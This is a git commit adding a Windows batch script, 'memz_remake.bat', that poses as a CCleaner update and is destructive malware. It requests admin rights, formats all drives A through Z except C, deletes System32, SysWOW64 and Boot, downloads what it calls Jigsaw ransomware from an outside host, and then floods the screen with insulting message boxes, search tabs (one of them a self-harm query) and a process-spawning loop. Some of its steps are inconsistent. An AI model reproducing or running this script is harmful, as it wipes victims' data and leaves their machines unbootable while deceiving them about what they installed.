01a353dc57c119265ddab9398f31749c65237871
Phoenixthrush <44802077+Phoenixthrush@users.noreply.github.com>
2020-07-08 21:43:00 +0200

    Create memz_remake.bat

---
+++ phoenixzoo/phoenixthrush/memz_remake.bat
@@ -0,0 +1,417 @@
+@echo off
+color c
+title New Project "CCleaner v.1.4"
+
+#New Version by Phoenixthrush
+
+#Ask for Admin rights
+
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+
+#Format all Hard Disks
+
+FORMAT A: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT B: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT D: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT E: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT F: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT G: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT H: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT I: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT J: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT K: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT L: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT M: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT N: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT O: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT P: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT Q: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT R: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT S: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT T: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT U: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT V: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT W: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT X: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT Y: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+FORMAT Z: /FS:NTFS /V:Suck my Dick /Q /X /U
+
+#Delete all System Files
+
+cd C:\Windows\System32
+takeown /F . /R
+del . /s /q
+cd C:\Windows\System
+takeown /F . /R
+del . /s /q
+cd C:\Windows\Boot
+takeown /F . /R
+del . /s /q
+cd C:\Windows\SysWOW64
+takeown /F . /R
+del . /s /q
+cd C:\pagefile.sys
+takeown /F . /R
+del . /s /q
+cd C:\hiberfil.sys
+takeown /F . /R
+del . /s /q
+cd C:\AppData
+takeown /F . /R
+del . /s /q
+
+#Locate to the Download Folder
+
+cd C:\Windows\Temp
+
+#Jigsaw Ransomeware
+
+bitsadmin /transfer debjob /download /priority foreground https://uploadhaven.com/download/d8f9e1e8b2dfb15802f0a0bcf3a5b5c1
+
+#Creating kill message
+
+>%userprofile%\Desktop\ReadMe.txt (
+echo Hey,
+echo.
+echo Windows sucks!
+echo I must installed Windows so many times fuck mannn...
+echo Btw. i'm sry bro Windows will not boot up again!
+echo Just use Linux, maybe Kali ^^
+echo Just don't try to get your Data back!
+echo Should you install Windows new, you can see, that I have deleted all Files on your Hard Disks!
+echo Windows is stupid shit!
+echo Nobody can get your Files back!
+echo.
+echo Sweet Greetings!
+)
+
+#Creating Google Payload
+
+>C:\Windows\Temp\GooglePayload.bat (
+echo @echo off
+echo color c
+echo.
+echo :GooglePayload
+echo.
+echo start "" "http://google.co.ck/search?q=Fortnite+is+gay"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=Minecraft+is+the+best+game+in+the+world"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=best+way+to+kill+yourself"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=how+2+remove+a+virus"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=mcafee+vs+norton"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=how+to+send+a+virus+to+my+friend"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=minecraft+hax+download+no+virus"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=how+to+get+money"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=bonzi+buddy+download+free"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=how+2+buy+weed"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=how+to+code+a+virus+in+visual+basic"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=batch+virus+download"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=virus.exe"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=internet+explorer+is+the+best+browser"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=facebook+hacking+tool+free+download+no+virus+working+2019"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=virus+builder+legit+free+download"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=how+to+create+your+own+ransomware"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=dank+memz"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=half+life+3+release+date"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=is+illuminati+real"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=montage+parody+making+program+2019"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=the+memz+are+real"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=stanky+danky+maymays"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=john+cena+midi+legit+not+converted"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=vinesauce+meme+collection"
+echo timeout 10
+echo start "" "http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi"
+echo timeout 10
+echo start "" "http://play.clubpenguin.com"
+echo timeout 10
+echo start "" "http://pcoptimizerpro.com"
+echo timeout 10
+echo start "" "http://softonic.com"
+echo timeout 10
+echo.
+echo goto GooglePayload
+)
+
+#Creating MSGBox
+
+>C:\Windows\Temp\MSG1.vbs (
+echo MsgBox "REST IN PISS, FOREVER MISS", vbExclamation, "you are such a loser"
+)
+
+>C:\Windows\Temp\MSG2.vbs (
+echo MsgBox "I WARNED YOU...", vbExclamation, "Windows sucks"
+)
+
+>C:\Windows\Temp\MSG3.vbs (
+echo MsgBox "HAHA N00B L2P G3T R3KT", vbExclamation, "use Linux!"
+)
+
+>C:\Windows\Temp\MSG4.vbs (
+echo MsgBox "You failed at your 1337 h4x0r skillz", vbExclamation, "u stupid shit"
+)
+
+>C:\Windows\Temp\MSG5.vbs (
+echo MsgBox "YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!", vbExclamation, "LOL"
+)
+
+>C:\Windows\Temp\MSG6.vbs (
+echo MsgBox "HACKER! ENJOY BAN!", vbExclamation, "I have spend so much time for this"
+)
+
+>C:\Windows\Temp\MSG7.vbs (
+echo MsgBox "GET BETTER HAX NEXT TIME xD", vbExclamation, "go cry"
+)
+
+>C:\Windows\Temp\MSG8.vbs (
+echo MsgBox "HAVE FUN TRYING TO RESTORE YOUR DATA :D", vbExclamation, "fuck of"
+)
+
+>C:\Windows\Temp\MSG9.vbs (
+echo MsgBox "BSOD INCOMING", vbExclamation, "I hate Windows"
+)
+
+>C:\Windows\Temp\MSG10.vbs (
+echo MsgBox "VIRUS PRANK GONE WRONG", vbExclamation, "All your files are gone"
+)
+
+>C:\Windows\Temp\MSG11.vbs (
+echo MsgBox "Dank Memes are the best one", vbExclamation, "It is a bit emotional that I have wrote this"
+)
+
+>C:\Windows\Temp\MSG12.vbs (
+echo MsgBox "Get dank antivirus m9!", vbExclamation, "Your gay"
+)
+
+>C:\Windows\Temp\MSG13.vbs (
+echo MsgBox "You are an idiot! HA HA HA HA HA HA HA", vbExclamation, "stupid"
+)
+
+>C:\Windows\Temp\MSG14.vbs (
+echo MsgBox "#MakeMalwareGreatAgain", vbExclamation, "bro, IÃƒâ€šÃ‚Â´m a stupid Kid which copied some Skripts..."
+)
+
+>C:\Windows\Temp\MSG15.vbs (
+echo MsgBox "SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME", vbExclamation, "Minecraft hax"
+)
+
+>C:\Windows\Temp\MSG16.vbs (
+echo MsgBox "Fortnite is gay!", vbExclamation, "Why do you just started this Programm"
+)
+
+>C:\Windows\Temp\MSG17.vbs (
+echo MsgBox "SecureBoot sucks.", vbExclamation, "Your PC is going to die"
+)
+
+>C:\Windows\Temp\MSG18.vbs (
+echo MsgBox "gr8 m8 i r8 8/8", vbExclamation, "This is the end of your PC! Have a nice Day!"
+)
+
+>C:\Windows\Temp\MSG19.vbs (
+echo MsgBox "Have you tried turning it off and on again?", vbExclamation, "Bye! Hahahahha"
+)
+
+#Download Message
+
+>C:\Windows\Temp\DownloadMessage.vbs (
+echo MsgBox "The Update of CCleaner started!", vbOKOnly, "Thanks for Downloading!"
+)
+
+#Creating VBS Skript to run the Google Payload in Background
+
+set temp=C:\Windows\Temp\
+set name=HideGoogle.vbs
+set line1=Set WshShell = WScript.CreateObject( "WScript.Shell" )
+set line2=WshShell.Run "C:\Windows\Temp\GooglePayload.bat",0,True
+
+echo %line1% >> %temp%%name%
+echo %line2% >> %temp%%name%
+
+#Creating VBS Skript to run the MSG Payload in Background
+
+set temp=C:\Windows\Temp\
+set name=HideMSG.vbs
+set line1=Set WshShell = WScript.CreateObject( "WScript.Shell" )
+set line2=WshShell.Run "C:\Windows\Temp\GooglePayload.bat",0,True
+
+echo %line1% >> %temp%%name%
+echo %line2% >> %temp%%name%
+
+#Run the MSGs
+
+>C:\Windows\Temp\MSGs.bat (
+echo echo off
+echo.
+echo :Loop
+echo start MSG1.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG2.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG3.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG4.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG5.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG6.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG7.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG8.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG9.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG10.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG11.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG12.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG13.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG14.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG15.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG16.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG17.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG18.vbs
+echo timeout 5
+echo taskkill /im wscript.exe /f
+echo start MSG19.vbs
+echo timeout 5
+
+echo goto Loop
+)
+
+#Hide and set Read Only on Skripts
+
+attrib +r +h +s C:\Windows\Temp\DownloadMessage.vbs
+attrib +r +h +s C:\Windows\Temp\CCleaner64.exe
+attrib +r +h +s C:\Windows\Temp\MSG1.vbs
+attrib +r +h +s C:\Windows\Temp\MSG2.vbs
+attrib +r +h +s C:\Windows\Temp\MSG3.vbs
+attrib +r +h +s C:\Windows\Temp\MSG4.vbs
+attrib +r +h +s C:\Windows\Temp\MSG5.vbs
+attrib +r +h +s C:\Windows\Temp\MSG6.vbs
+attrib +r +h +s C:\Windows\Temp\MSG7.vbs
+attrib +r +h +s C:\Windows\Temp\MSG8.vbs
+attrib +r +h +s C:\Windows\Temp\MSG9.vbs
+attrib +r +h +s C:\Windows\Temp\MSG10.vbs
+attrib +r +h +s C:\Windows\Temp\MSG11.vbs
+attrib +r +h +s C:\Windows\Temp\MSG12.vbs
+attrib +r +h +s C:\Windows\Temp\MSG13.vbs
+attrib +r +h +s C:\Windows\Temp\MSG14.vbs
+attrib +r +h +s C:\Windows\Temp\MSG15.vbs
+attrib +r +h +s C:\Windows\Temp\MSG16.vbs
+attrib +r +h +s C:\Windows\Temp\MSG17.vbs
+attrib +r +h +s C:\Windows\Temp\MSG18.vbs
+attrib +r +h +s C:\Windows\Temp\MSG19.vbs
+attrib +r +h +s C:\Windows\Temp\HideGoogle.vbs
+attrib +r +h +s C:\Windows\Temp\
+attrib +r +h +s C:\Windows\Temp\HideMSG.vbs
+attrib +r +h +s C:\Windows\Temp\
+attrib +r +h +s C:\Windows\Temp\jigsaw.exe
+attrib +r +h +s C:\Windows\Temp\MSGs.vbs
+
+#Download CCleaner
+
+bitsadmin /transfer mydownloadjob /download /priority foreground "https://download.ccleaner.com/ccsetup563.exe" "C:\Windows\Temp\CCleaner64.exe"
+
+#Running all Skripts
+
+cd C:\Windows\Temp\
+start DownloadMessage.vbs
+start CCleaner64.exe
+timeout 180
+start HideGoogle.vbs
+start HideMSG.vbs
+start jigsaw.exe
+cd %userprofile%\Desktop
+start ReadMe.exe
+timeout 350
+
+:deathloop
+
+start ReadMe.txt
+start calc.exe
+start notepad.exe
+start cmd.exe
+start write.exe
+start regedit.exe
+start explorer.exe
+start taskmgr.exe
+start msconfig.exe
+start mspaint.exe
+start devmgmt.msc
+start control.exe
+start mmc.exe
+
+goto deathloop
